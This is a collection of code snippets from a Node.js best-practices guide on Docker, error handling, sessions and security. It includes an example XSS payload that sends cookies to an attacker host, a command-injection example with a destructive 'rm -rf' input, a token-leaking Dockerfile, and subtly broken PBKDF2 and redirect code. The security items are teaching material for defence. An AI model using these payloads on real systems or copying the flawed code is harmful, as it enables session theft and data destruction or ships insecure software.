DESCRIPTION: Presents an insecure method (anti-pattern) where a secret passed as a build argument is used in a single-stage build. The secret is written to a file (`.npmrc`) and then immediately deleted within the same `RUN` command. While this removes the file, the secret remains visible in the layer history created by the `RUN` instruction, making it easily retrievable by inspecting the image history.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/avoid-build-time-secrets.md#_snippet_2

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim

ARG NPM_TOKEN

WORKDIR /usr/src/app
COPY . /dist

RUN echo "//registry.npmjs.org/:\_authToken=\$NPM_TOKEN" > .npmrc && \
 npm ci --production && \
 rm -f .npmrc

# Deleting the .npmrc within the same copy command will not save it inside the layer, however it can be found in image history

CMD ["node", "index.js"]
```

----------------------------------------

TITLE: Example Malicious HTML Injection XSS
DESCRIPTION: This code snippet presents a hypothetical example of malicious HTML content that includes an embedded JavaScript script designed to steal a user's session cookie. Such content, if stored in a database (like user comments) and then rendered onto a webpage without proper escaping, would execute the script in the user's browser, demonstrating a classic Cross-Site Scripting (XSS) attack vector.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.french.md#_snippet_1

LANGUAGE: HTML
CODE:
```
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>
```

----------------------------------------

TITLE: Hashing and Comparing Passwords with PBKDF2 (JavaScript)
DESCRIPTION: Illustrates synchronous password hashing using Node.js's native `crypto.pbkdf2Sync` function, which requires a salt, iteration count, digest algorithm, and key length. It demonstrates how to compare a password against the resulting hexadecimal hash. Requires the built-in Node.js `crypto` module.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/userpasswords.french.md#_snippet_2

LANGUAGE: JavaScript
CODE:
```
try {
  const outSize = 64;
  const digest = 'blake2b512';
  const iterations = 12;
  const hash = crypto.pbkdf2Sync('myPassword','someUniqueUserValueForSalt', iterations * 1000, digest, outSize).toString('hex');

  // Store secure hash in user record

  // compare a provided password input with saved hash
  const match = hash === crypto.pbkdf2Sync('somePassword','derivedSalt', iterations * 1000, digest, outSize).toString('hex');

  if (match) {
   // Passwords match
  } else {
   // Passwords don't match
  }
} catch {
  logger.error('could not hash password.')
}
```

----------------------------------------

TITLE: Configuring Secure Express Session Middleware (JavaScript)
DESCRIPTION: This snippet demonstrates how to configure the express-session middleware with recommended security settings. It sets a custom name to hide the default identifier, sets cookie.httpOnly to true to prevent client-side script access, cookie.secure to true to require HTTPS, and cookie.maxAge to define the cookie's expiration time. It requires the express-session middleware to be installed and imported.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/sessions.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// using the express session middleware
app.use(session({
  secret: 'youruniquesecret', // secret string used in the signing of the session ID that is stored in the cookie
  name: 'youruniquename', // set a unique name to remove the default connect.sid
  cookie: {
    httpOnly: true, // minimize risk of XSS attacks by restricting the client from reading the cookie
    secure: true, // only send cookie over https
    maxAge: 60000*60*24 // set cookie expiry length in ms
  }
}));
```

----------------------------------------

TITLE: Executing Node.js with PM2 in Dockerfile (Anti-Pattern)
DESCRIPTION: This Dockerfile illustrates an anti-pattern where a Node.js application is run using `pm2-runtime`, an in-container process manager. While PM2 can manage processes locally, using it within a container prevents the Docker orchestrator from having visibility into the application's health and status. This hinders the orchestrator's ability to effectively manage restarts, perform optimal scheduling, and make cluster-aware decisions, potentially leading to less resilient and less efficiently managed deployments.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/restart-and-replicate-processes.md#_snippet_1

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim

# The build logic comes here

CMD ["pm2-runtime", "index.js"]
```

----------------------------------------

TITLE: Extending Built-in Error with AppError (JavaScript)
DESCRIPTION: Provides an example of creating a centralized application-specific error class (`AppError`) by extending the built-in Error object using traditional JavaScript prototypes. This allows adding custom properties (like `name`, `httpCode`, `isOperational`) while preserving the stack trace via `Error.captureStackTrace` and maintaining compatibility with the Error type.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/useonlythebuiltinerror.md#_snippet_2

LANGUAGE: javascript
CODE:
```
// centralized error object that derives from Node’s Error
function AppError(name, httpCode, description, isOperational) {
    Error.call(this);
    Error.captureStackTrace(this);
    this.name = name;
    //...other properties assigned here
};

AppError.prototype = Object.create(Error.prototype);
AppError.prototype.constructor = AppError;

module.exports.AppError = AppError;

// client throwing an exception
if(user == null)
    throw new AppError(commonErrors.resourceNotFound, commonHTTPErrors.notFound, 'further explanation', true)
```

----------------------------------------

TITLE: Defining Centralized Error Handler Class - Node.js Typescript
DESCRIPTION: Defines a Typescript class `ErrorHandler` for centralized error handling. The `handleError` method orchestrates logging, monitoring metric firing, and response/crash decisions. Requires `logger` and monitoring/response utilities.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/centralizedhandling.md#_snippet_3

LANGUAGE: typescript
CODE:
```
class ErrorHandler {
  public async handleError(error: Error, responseStream: Response): Promise<void> {
    await logger.logError(error);
    await fireMonitoringMetric(error);
    await crashIfUntrustedErrorOrSendResponse(error, responseStream);
  };
}

export const handler = new ErrorHandler();
```

----------------------------------------

TITLE: Starting Node.js App with Tini and CMD - Dockerfile
DESCRIPTION: Demonstrates the recommended pattern for running Node.js applications in Docker when they spawn child processes. It uses Tini as the entrypoint to handle signals correctly and reap zombie processes, combined with the `CMD ["node", "server.js"]` exec form.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.md#_snippet_1

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

# Add Tini if using child-processes
ENV TINI_VERSION v0.19.0
ADD https://github.com/krallin/tini/releases/download/${TINI_VERSION}/tini /tini
RUN chmod +x /tini

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm clean cache --force

ENTRYPOINT ["/tini", "--"]

CMD ["node", "server.js"]
```

----------------------------------------

TITLE: Bootstrapping Node.js App with TINI in Docker; Dockerfile
DESCRIPTION: This snippet demonstrates how to use TINI as the entrypoint for a Docker container running a Node.js application. TINI acts as a minimal init system, properly handling signals and reaping zombie processes, which is especially useful if your Node.js app spawns child processes. The Node.js process is then started via the recommended exec form CMD.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.french.md#_snippet_1

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

# Add Tini if using child-processes
ENV TINI_VERSION v0.19.0
ADD https://github.com/krallin/tini/releases/download/${TINI_VERSION}/tini /tini
RUN chmod +x /tini

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm clean cache --force

ENTRYPOINT ["/tini", "--"]

CMD ["node", "server.js"]
```

----------------------------------------

TITLE: Running Node.js as Root Process Dockerfile
DESCRIPTION: This Dockerfile snippet shows how to run the Node.js application directly as the container's primary process (PID 1) using the `CMD` instruction. This configuration allows the container orchestrator to send signals like SIGTERM directly to the Node.js process, enabling graceful shutdown handling within the application code. It assumes `index.js` is the application entry point.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/graceful-shutdown.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim

# Build logic comes here

CMD ["node", "index.js"]
#This line above will make Node.js the root process (PID1)

```

----------------------------------------

TITLE: Implementing TransactionId with AsyncLocalStorage in Express.js
DESCRIPTION: This snippet demonstrates how to use Node.js built-in `AsyncLocalStorage` to manage a unique transaction ID for each incoming request in an Express application. A middleware sets the ID (generating a new one or using a header value), and subsequent code (like route handlers and a logger) can access it from the asynchronous context store. It also shows how to pass the ID in outgoing HTTP headers for microservice communication.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/assigntransactionid.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
const express = require('express');
const { AsyncLocalStorage } = require('async_hooks');
const uuid = require('uuid/v4');

const asyncLocalStorage = new AsyncLocalStorage();

// Set incoming requests TransactionId
const transactionIdMiddleware = (req, res, next) => {
    // The first asyncLocalStorage.run argument is the initialization of the store state, the second argument is the function that has access to that store
    asyncLocalStorage.run(new Map(), () => {
        // Try to extract the TransactionId from the request header, or generate a new one if it doesn't exist
        const transactionId = req.headers['transactionId'] || uuid();

        // Set the TransactionId inside the store
        asyncLocalStorage.getStore().set('transactionId', transactionId);
        
        // By calling next() inside the function, we make sure all other middlewares run within the same AsyncLocalStorage context 
        next();
    });
};

const app = express();
app.use(transactionIdMiddleware);

// Set outgoing requests TransactionId
app.get('/', (req, res) => {
    // Once TransactionId has been initialized inside the middleware, it's accessible at any point of the request flow
    const transactionId = asyncLocalStorage.getStore().get('transactionId');

    try {
        // Add TransactionId as header in order to pass it to the next service
        const response = await axios.get('https://externalService.com/api/getAllUsers', headers: {
        'x-transaction-id': transactionId
        });
    } catch (err) {
        // The error is being passed to the middleware, and there's no need to send over the TransactionId
        next(err);
    }

    logger.info('externalService was successfully called with TransactionId header');

    res.send('OK');
});

// Error handling middleware calls the logger
app.use(async (err, req, res, next) => {
    await logger.error(err);
});

// The logger can now append the TransactionId to each entry so that entries from the same request will have the same value
class logger {
    error(err) {
        console.error(`${err} ${asyncLocalStorage.getStore().get('transactionId')}`);
    }

    info(message) {
        console.log(`${message} ${asyncLocalStorage.getStore().get('transactionId')}`);
    }
}
```

----------------------------------------

TITLE: Implementing Safe Redirect with Whitelist in Express Javascript
DESCRIPTION: This snippet provides a safer approach to handling redirects by introducing a whitelist of allowed URLs and a function to validate the user-supplied URL. It checks if the URL is a local path or matches an entry in the whitelist before performing the redirection, preventing redirects to arbitrary external sites.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/saferedirects.md#_snippet_1

LANGUAGE: javascript
CODE:
```
const whitelist = { 
  'https://google.com': 1 
};

function getValidRedirect(url) { 
    // check if the url starts with a single slash 
  if (url.match(/^/(?!/)/)) { 
    // Prepend our domain to make sure 
    return 'https://example.com' + url; 
  } 
    // Otherwise check against a whitelist
  return whitelist[url] ? url : '/'; 
}

app.get('/login', (req, res, next) => {

  if (req.session.isAuthenticated()) {
    res.redirect(getValidRedirect(req.query.url));
  }

}); 
```

----------------------------------------

TITLE: Handling Errors with Promises - JavaScript
DESCRIPTION: Demonstrates how to chain asynchronous operations using Promises and handle errors centrally with a single `.catch()` block. Errors occurring in any preceding `.then()` are caught here. A final `.then()` or `.finally()` can be used for cleanup or subsequent actions.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/asyncerrorhandling.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
return functionA()
  .then(functionB)
  .then(functionC)
  .then(functionD)
  .catch((err) => logger.error(err))
  .then(alwaysExecuteThisFunction)
```

----------------------------------------

TITLE: Testing Express App with Supertest - JavaScript
DESCRIPTION: This example illustrates how to use the `supertest` library to perform in-process testing of an Express application. It defines a simple Express app with an endpoint and then uses `supertest(app)` to make a mock HTTP request (`.get('/user')`), assert response headers, status code (`expect(200)`), and handles potential errors. This approach allows for fast tests without network overhead.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/projectstructre/separateexpress.korean.md#_snippet_2

LANGUAGE: javascript
CODE:
```
const app = express();

app.get('/user', function(req, res) {
  res.status(200).json({ name: 'tobi' });
});

request(app)
  .get('/user')
  .expect('Content-Type', /json/)
  .expect('Content-Length', '15')
  .expect(200)
  .end(function(err, res) {
    if (err) throw err;
  });
```

----------------------------------------

TITLE: Basic Multi-Stage Build with Caching - Dockerfile
DESCRIPTION: This complete multi-stage Dockerfile example demonstrates caching principles for a basic Node.js application requiring OS build dependencies. It separates the build stage (installing deps, copying files) from the final, lean runtime stage, copying only necessary artifacts to minimize the final image size and maximize cache reuse for stable steps.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.french.md#_snippet_3

LANGUAGE: Dockerfile
CODE:
```
FROM node:10.22.0-alpine3.11 as builder

RUN apk add --no-cache \
    build-base \
    gcc \
    g++ \
    make

USER node
WORKDIR /app
COPY "package.json" "package-lock.json" "./"
RUN npm ci --production
COPY . "./"


FROM node as app

USER node
WORKDIR /app
COPY --from=builder /app/ "./"
RUN npm prune --production

CMD ["node", "dist/server.js"]
```

----------------------------------------

TITLE: Basic Multi-Stage Dockerfile for Node.js with OS Dependencies
DESCRIPTION: Presents a complete multi-stage Dockerfile example for a Node.js application that requires OS-level build dependencies. It shows how to structure the Dockerfile to leverage caching by installing OS packages and Node dependencies early, then copying application code to a builder stage before copying necessary artifacts to the final, slimmer app stage.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.md#_snippet_3

LANGUAGE: Dockerfile
CODE:
```
#Create node image version alias
FROM node:10.22.0-alpine3.11 as builder

RUN apk add --no-cache \
    build-base \
    gcc \
    g++ \
    make

USER node
WORKDIR /app
COPY "package.json" "package-lock.json" "./"
RUN npm ci --production
COPY . "./"


FROM node as app

USER node
WORKDIR /app
COPY --from=builder /app/ "./"
RUN npm prune --production

CMD ["node", "dist/server.js"]
```

----------------------------------------

TITLE: Typescript Anti-pattern: Negative Value Bug
DESCRIPTION: This example demonstrates an anti-pattern in Typescript where, despite type annotations, value validation is missing. The `redirectToPrintDiscount` function expects a `number` for `discount`. A negative number (`-12`) is passed, which satisfies the type requirement but is logically invalid for a 'positive discount'. The condition `if (discount != 0)` is true for -12, still causing the unwanted redirection and highlighting that types alone don't replace runtime value validation.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/failfast.md#_snippet_2

LANGUAGE: typescript
CODE:
```
// if the discount is positive let's then redirect the user to print his discount coupons
function redirectToPrintDiscount(httpResponse: Response, member: Member, discount: number) {
  if (discount != 0) {
    httpResponse.redirect(`/discountPrintView/${member.id}`);
  }
}

redirectToPrintDiscount(httpResponse, someMember, -12);
// We passed a negative parameter discount, why the heck was the user redirected to the discount screen?
```

----------------------------------------

TITLE: Installing Production Dependencies in Dockerfile
DESCRIPTION: This Dockerfile snippet demonstrates building a production-ready Node.js image by installing only production dependencies using `npm ci --production`. It copies the package files, performs a clean install focused on production, and then forcefully cleans the npm cache to reduce image size, resulting in a smaller and more secure image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/install-for-production.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm cache clean --force

# The rest comes here
```

----------------------------------------

TITLE: Anti-Pattern: Recursive Copying - Dockerfile
DESCRIPTION: This snippet shows an anti-pattern in a Dockerfile where the COPY . . command recursively copies all files from the build context into the image. This practice is problematic as it can include sensitive files (like .env or .aws) and unnecessary development artifacts, leading to security risks and larger image sizes. It should be avoided in favor of explicit copying combined with a .dockerignore file.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/docker-ignore.md#_snippet_1

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
# The next line copies everything
COPY . .

# The rest comes here
```

----------------------------------------

TITLE: Install Dependencies using npm ci Command
DESCRIPTION: Use the `npm ci` command in automated environments (like CI/CD or production deployments) to perform a clean installation of dependencies based strictly on the `package-lock.json` or `npm-shrinkwrap.json` file. This command ensures that you use the exact versions specified in the lock file, fails if the lock file is missing or out of sync with `package.json`, automatically removes existing `node_modules`, and is significantly faster than `npm install`.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/installpackageswithnpmci.md#_snippet_0

LANGUAGE: shell
CODE:
```
npm ci
```

----------------------------------------

TITLE: Antipattern: Using npm start in Docker; Dockerfile
DESCRIPTION: This snippet illustrates an incorrect and discouraged method for starting a Node.js application in Docker using `CMD "npm start"`. Using `npm start` prevents proper signal forwarding to the application, hindering graceful shutdown and potentially leaving zombie processes. This is considered an antipattern.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.french.md#_snippet_2

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm cache clean --force

# don’t do that!
CMD "npm start"
```

----------------------------------------

TITLE: Copying Package Files Early for Caching - Dockerfile
DESCRIPTION: This snippet shows the recommended approach of copying only the project's package definition files (`package.json`, `package-lock.json`) and running the dependency installation (`npm ci`) early in the Dockerfile. This allows Docker to cache this potentially time-consuming step if the package files haven't changed, significantly reducing build times.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.french.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
COPY "package.json" "package-lock.json" "./"
RUN npm ci
```

----------------------------------------

TITLE: Basic Multi-Stage Node.js Docker Build
DESCRIPTION: This Dockerfile demonstrates a basic multi-stage build. The first stage (`AS build`) builds the application, including development dependencies. The second stage copies the built output (`dist`) and production-only dependencies from the build stage, resulting in a smaller final image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.french.md#_snippet_1

LANGUAGE: dockerfile
CODE:
```
FROM node:14.4.0 AS build

COPY --chown=node:node . .
RUN yarn install --frozen-lockfile && yarn build


FROM node:14.4.0

USER node
EXPOSE 8080

# Copy results from previous stage
COPY --chown=node:node --from=build /home/node/app/dist /home/node/app/package.json /home/node/app/yarn.lock ./
RUN yarn install --frozen-lockfile --production

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Anti-pattern: Missing Argument Side Effect (Javascript)
DESCRIPTION: This snippet illustrates an anti-pattern where a function lacks input validation. The 'redirectToPrintDiscount' function is intended to redirect a user based on a 'discount' value but is called without providing the 'discount' argument. Due to the absence of validation, the condition (discount != 0) evaluates unexpectedly, leading to an incorrect redirection and a hidden bug that is hard to trace back to the source.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/failfast.korean.md#_snippet_1

LANGUAGE: javascript
CODE:
```
// if the discount is positive let's then redirect the user to print his discount coupons
function redirectToPrintDiscount(httpResponse, member, discount) {
    if (discount != 0) {
        httpResponse.redirect(`/discountPrintView/${member.id}`);
    }
}

redirectToPrintDiscount(httpResponse, someMember);
// forgot to pass the parameter discount, why the heck was the user redirected to the discount screen?
```

----------------------------------------

TITLE: Configuring & Integrating JWT Blacklisting in Express (JavaScript)
DESCRIPTION: Demonstrates integrating the `express-jwt-blacklist` library with `express-jwt` in a Node.js Express application. It shows how to configure the blacklist using an external store (Memcached in this example, but Redis is recommended) and integrate the `isRevoked` check into the JWT middleware, also providing an example of revoking a token on logout.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/expirejwt.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const jwt = require('express-jwt');
const blacklist = require('express-jwt-blacklist');

blacklist.configure({
  tokenId: 'jti',
  strict: true,
  store: {
    type: 'memcached',
    host: '127.0.0.1',
    port: 11211,
    keyPrefix: 'mywebapp:',
    options: {
      timeout: 1000
    }
  }
});

app.use(jwt({
  secret: 'my-secret',
  isRevoked: blacklist.isRevoked
}));

app.get('/logout', (req, res) => {
  blacklist.revoke(req.user)
  res.sendStatus(200);
});
```

----------------------------------------

TITLE: Executing Shell Command with Unsanitized User Input - JavaScript
DESCRIPTION: This snippet demonstrates a dangerous pattern where user input is directly concatenated into a shell command executed via `child_process.exec`. This makes the application vulnerable to command injection attacks, allowing malicious users to execute arbitrary system commands.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/childprocesses.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const { exec } = require('child_process');

...

// as an example, take a script that takes two arguments, one of them is unsanitized user input
exec('"/path/to/test file/someScript.sh" --someOption ' + input);

// -> imagine what could happen if the user simply enters something like '&& rm -rf --no-preserve-root /'
// you'd be in for an unwanted surprise
```

----------------------------------------

TITLE: Anti-Pattern: Returning Unawaited Promise in Javascript
DESCRIPTION: This snippet demonstrates an anti-pattern where an async function `returnWithoutAwait` calls another async function `throwAsync` and returns its promise directly without using `await`. When `throwAsync` throws an error, the `returnWithoutAwait` frame is missing from the resulting stacktrace, making debugging difficult.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/returningpromises.md#_snippet_0

LANGUAGE: javascript
CODE:
```
async function throwAsync(msg) {
  await null // need to await at least something to be truly async (see note #2)
  throw Error(msg)
}

async function returnWithoutAwait () {
  return throwAsync('missing returnWithoutAwait in the stacktrace')
}

// 👎 will NOT have returnWithoutAwait in the stacktrace
returnWithoutAwait().catch(console.log)
```

----------------------------------------

TITLE: Anti-Pattern: Using Async Callback Directly with Sync Expecting Function in Javascript
DESCRIPTION: This snippet illustrates passing an async function `getUser` directly as a callback to `Array.prototype.map`, which is then used with `Promise.all`. While this might work functionally in some cases, the stacktrace produced upon error will include `getUser` and `Promise.all` but miss the specific line where `getUser` was called within the `map` iteration, hindering debugging.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/returningpromises.md#_snippet_4

LANGUAGE: javascript
CODE:
```
async function getUser (id) {
  await null
  if (!id) throw Error('stacktrace is missing the place where getUser has been called')
  return {id}
}

const userIds = [1, 2, 0, 3]

// 👎 the stacktrace would include getUser function but would give no clue on where it has been called
Promise.all(userIds.map(getUser)).catch(console.log)
```

----------------------------------------

TITLE: Creating Operational Errors in TypeScript
DESCRIPTION: This TypeScript code defines an `AppError` class that extends the built-in `Error`, adding `commonType` and `isOperational` properties. It demonstrates type-safe creation of operational errors, utilizing `super()` to call the parent constructor and `Object.setPrototypeOf` to correctly restore the prototype chain, which is common practice when extending built-in classes in TypeScript.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/operationalvsprogrammererror.md#_snippet_1

LANGUAGE: typescript
CODE:
```
// some centralized error factory (see other examples at the bullet "Use only the built-in Error object")
export class AppError extends Error {
  public readonly commonType: string;
  public readonly isOperational: boolean;

  constructor(commonType: string, description: string, isOperational: boolean) {
    super(description);

    Object.setPrototypeOf(this, new.target.prototype); // restore prototype chain

    this.commonType = commonType;
    this.isOperational = isOperational;

    Error.captureStackTrace(this);
  }
}

// marking an error object as operational (true)
throw new AppError(errorManagement.commonErrors.InvalidInput, 'Describe here what happened', true);
```

----------------------------------------

TITLE: Installing Production Dependencies in Dockerfile
DESCRIPTION: Demonstrates installing only production dependencies using `npm ci --production` and cleaning the npm cache to minimize the Docker image size and reduce the attack surface. Requires Node.js and npm available in the base image and a `package-lock.json` file.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/install-for-production.french.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm cache clean --force

# The rest comes here
```

----------------------------------------

TITLE: Multi-Stage Node.js Docker Build with Alpine
DESCRIPTION: This Dockerfile extends the basic multi-stage pattern by using different base images. It uses a standard Node.js image for the build stage and a minimal Node.js Alpine image for the runtime stage, further reducing the final image size and attack surface.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.french.md#_snippet_2

LANGUAGE: dockerfile
CODE:
```
FROM node:14.4.0 AS build

COPY --chown=node:node . .
RUN yarn install --frozen-lockfile && yarn build


# This will use a minimal base image for the runtime
FROM node:14.4.0-alpine

USER node
EXPOSE 8080

# Copy results from previous stage
COPY --chown=node:node --from=build /home/node/app/dist /home/node/app/package.json /home/node/app/yarn.lock ./
RUN yarn install --frozen-lockfile --production

CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Demonstrating Error Handling Flow - Node.js Typescript
DESCRIPTION: Illustrates a recommended error handling flow in Node.js applications using Typescript. Errors are propagated from lower layers (DAL) to API routes, caught by a middleware or equivalent mechanism, and then delegated to a central error handler for logging, monitoring, and response generation. Includes handling for `uncaughtException` and `unhandledRejection`. Requires express types (`Request`, `Response`, `NextFunction`) and potentially other types (`Error`, `Result`).
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/centralizedhandling.md#_snippet_1

LANGUAGE: typescript
CODE:
```
// DAL layer, we don't handle errors here
DB.addDocument(newCustomer, (error: Error, result: Result) => {
  if (error)
    throw new Error('Great error explanation comes here', other useful parameters)
});

// API route code, we catch both sync and async errors and forward to the middleware
try {
  customerService.addNew(req.body).then((result: Result) => {
    res.status(200).json(result);
  }).catch((error: Error) => {
    next(error)
  });
}
catch (error) {
  next(error);
}

// Error handling middleware, we delegate the handling to the centralized error handler
app.use(async (err: Error, req: Request, res: Response, next: NextFunction) => {
  await errorHandler.handleError(err, res);
});

process.on("uncaughtException", (error:Error) => {
  errorHandler.handleError(error);
});

process.on("unhandledRejection", (reason) => {
  errorHandler.handleError(reason);
});
```

----------------------------------------

TITLE: Illustrating Abstract Equality (==) Behavior in JavaScript
DESCRIPTION: This snippet provides examples of how the abstract equality operator (`==`) behaves in JavaScript when comparing different types. It shows cases where type coercion leads to unexpected `true` results, highlighting the potential issues and reinforcing the recommendation to use `===` for strict comparison without type coercion.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_7

LANGUAGE: javascript
CODE:
```
"" == "0"; // false
0 == ""; // true
0 == "0"; // true

false == "false"; // false
false == "0"; // true

false == undefined; // false
false == null; // false
null == undefined; // true

" \t\r\n " == 0; // true
```

----------------------------------------

TITLE: Configuring Nginx to Serve Static Files
DESCRIPTION: This Nginx configuration snippet demonstrates how to set up a reverse proxy to efficiently serve static files like images, JavaScript, and CSS directly from a specified directory. It uses location blocks to match common static file paths, serving them from the file system (`root`), disabling access logging, and setting long expiry headers for browser caching, thereby reducing the load on the upstream Node.js application.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/frontendout.md#_snippet_0

LANGUAGE: nginx
CODE:
```
# configure gzip compression
gzip on;
keepalive 64;

# defining web server
server {
listen 80;
listen 443 ssl;

# handle static content
location ~ ^/(images/|img/|javascript/|js/|css/|stylesheets/|flash/|media/|static/|robots.txt|humans.txt|favicon.ico) {
root /usr/local/silly_face_society/node/public;
access_log off;
expires max;
}
}
```

----------------------------------------

TITLE: Testing Uncaught Exception Handling (Javascript)
DESCRIPTION: This snippet demonstrates how to test the application's handling of unexpected, uncaught exceptions. It uses Sinon to stub the logger and then simulates an uncaught exception by emitting the `uncaughtException` event on the `process` object. The test then asserts that the logger's error method was called with the specific error that was emitted. This requires a testing framework, Sinon, and access to the Node.js `process` object.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/testingerrorflows.md#_snippet_2

LANGUAGE: javascript
CODE:
```
test("When unhandled exception is throw, Then the logger reports correctly", async () => {
  //Arrange
  await api.startWebServer();
  const loggerDouble = sinon.stub(logger, "error");
  const errorToThrow = new Error("An error that wont be caught 😳");

  //Act
  process.emit("uncaughtException", errorToThrow);

  // Assert
  expect(loggerDouble.calledWith(errorToThrow));
});
```

----------------------------------------

TITLE: Anti-Pattern: Nested Callback Error Handling - JavaScript
DESCRIPTION: Shows the 'callback hell' anti-pattern where asynchronous functions are deeply nested, requiring repetitive error checks (`if(err !== null)`) at each level. This makes code hard to read, debug, and maintain due to convoluted control flow and redundant error handling logic.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/asyncerrorhandling.md#_snippet_2

LANGUAGE: JavaScript
CODE:
```
getData(someParameter, function(err, result) {
    if(err !== null) {
        // do something like calling the given callback function and pass the error
        getMoreData(a, function(err, result) {
            if(err !== null) {
                // do something like calling the given callback function and pass the error
                getMoreData(b, function(c) {
                    getMoreData(d, function(e) {
                        if(err !== null ) {
                            // you get the idea?
                        }
                    })
                });
            }
        });
    }
});
```

----------------------------------------

TITLE: Default Ignores for Node.js Builds - .dockerignore
DESCRIPTION: This snippet provides a recommended default .dockerignore file for Node.js projects. It specifies patterns for files and directories to exclude from the Docker build context, preventing sensitive data leakage and improving build performance. It excludes common development artifacts like node_modules, .git, .env, and build outputs.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/docker-ignore.md#_snippet_0

LANGUAGE: dockerignore
CODE:
```
**/node_modules/
**/.git
**/README.md
**/LICENSE
**/.vscode
**/npm-debug.log
**/coverage
**/.env
**/.editorconfig
**/.aws
**/dist
```

----------------------------------------

TITLE: Ignoring Development Files in Docker
DESCRIPTION: This `.dockerignore` file specifies patterns for files and directories to exclude from the Docker build context. Ignoring `node_modules` prevents copying existing dependencies, ensuring a clean install within the container. Ignoring `docs` removes unnecessary documentation files from the build context.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.french.md#_snippet_0

LANGUAGE: dockerignore
CODE:
```
# Don't copy in existing node_modules, we'll fetch our own
node_modules

# Docs are large, we don't need them in our Docker image
docs
```

----------------------------------------

TITLE: Defining Express Application - JavaScript
DESCRIPTION: This snippet demonstrates the core declaration of an Express application instance. It shows how to initialize Express, add middleware like `bodyParser.json()`, and mount routers for specific API endpoints. This code typically resides in a separate file (like `app.js`) to keep the API logic distinct from server setup.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/projectstructre/separateexpress.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
var app = express();
app.use(bodyParser.json());
app.use("/api/events", events.API);
app.use("/api/forms", forms);
```

----------------------------------------

TITLE: Applying Validation Middleware Express JavaScript
